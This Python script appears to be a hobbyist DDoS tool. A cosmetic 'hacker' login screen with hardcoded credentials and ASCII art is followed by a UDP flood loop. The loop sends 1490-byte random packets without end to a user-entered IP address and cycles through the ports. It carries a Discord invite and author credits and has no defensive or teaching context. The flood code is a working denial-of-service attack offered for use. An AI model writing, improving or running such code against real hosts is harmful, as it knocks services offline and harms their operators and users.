import os
import time
from getpass import getpass
from rich.console import Console
from rich.panel import Panel
from rich.text import Text

console = Console()

correct_username = "John"
correct_password = "paid"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def hacker_background():
    art = """
     ░░███╗░░███████╗██╗░░██╗██████╗░
     ░████║░░██╔════╝╚██╗██╔╝╚════██╗
     ██╔██║░░██████╗░░╚███╔╝░░█████╔╝
     ╚═╝██║░░╚════██╗░██╔██╗░░╚═══██╗
     ███████╗██████╔╝██╔╝╚██╗██████╔╝
     ╚══════╝╚═════╝░╚═╝░░╚═╝╚═════╝░
"""
    console.print(Panel(art, style="bold red"))

def show_ascii_art():
    ascii_art = """
░░     ███╗░░███████╗██╗░░██╗██████╗░
     ░████║░░██╔════╝╚██╗██╔╝╚════██╗
     ██╔██║░░██████╗░░╚███╔╝░░█████╔╝
     ╚═╝██║░░╚════██╗░██╔██╗░░╚═══██╗
     ███████╗██████╔╝██╔╝╚██╗██████╔╝
     ╚══════╝╚═════╝░╚═╝░░╚═╝╚═════╝░
"""
    console.print(Text(ascii_art, style="bold red"))
def animate_title():
    positions = ["   15x3", "15x3   "]
    for _ in range(6):
        for pos in positions:
            clear()
            console.print(Panel(Text(pos, justify="center", style="bold red"), border_style="red"))
            time.sleep(0.3)

def login():
    clear()
    hacker_background()

    for _ in range(3):
        console.print("[bold red]Username[/]: ", end="")
        username = input()
        password = getpass("[bold red]Password[/]: ")

        if username == correct_username and password == correct_password:
            console.print("\n[bold green]⚰ ,update Ddos John![/]\n")
            time.sleep(1)
            animate_title()
            clear()
            show_ascii_art()
            time.sleep(1.5)
            console.print(Panel("[bold red]      John methods list[/]", border_style="bright_red"))
            return
        else:
            console.print("[bold red] Wrong credentials! Try again.[/]")
            time.sleep(1)
            clear()
            hacker_background()

    console.print("[bold red] mini DdoS Denied![/]")

# Start the 15x3
login()
import socket
import random
import time
import threading
import requests
from colorama import init, Fore
import sys
import os
import time
import socket
import random
from datetime import datetime

# Dev Script 15x3
RED = '\033[91m'
RESET = '\033[0m'

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1490)
#############

def slow_print(text, delay=0.05):
    """Owner script  John <£ Yassine)"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()  # 15x3

os.system("clear")
os.system("figlet DDos Attack")

slow_print(RED + "vesrion v1  : by john" + RESET)
slow_print(RED + "discord   : https://discord.gg/cGMwrXzH26" + RESET)
print()

ip = input(RED + "IP Target : " + RESET)
port = int(input(RED + "Port       : " + RESET))

os.system("clear")
os.system("figlet Attack Starting")

# owner script RoMboo X Yassine
progress = [
    "[                    ] 0% ",
    "[=====               ] 25%",
    "[==========          ] 50%",
    "[===============     ] 75%",
    "[====================] 100%"
]
for p in progress:
    slow_print(RED + p + RESET, 0.02)
    time.sleep(1)

time.sleep(1)
sent = 0

while True:
    sock.sendto(bytes_data, (ip, port))
    sent += 1
    port += 1
    print(RED + f"Sent {sent} packet to {ip} through port:{port}" + RESET)
    if port == 65534:
        port = 1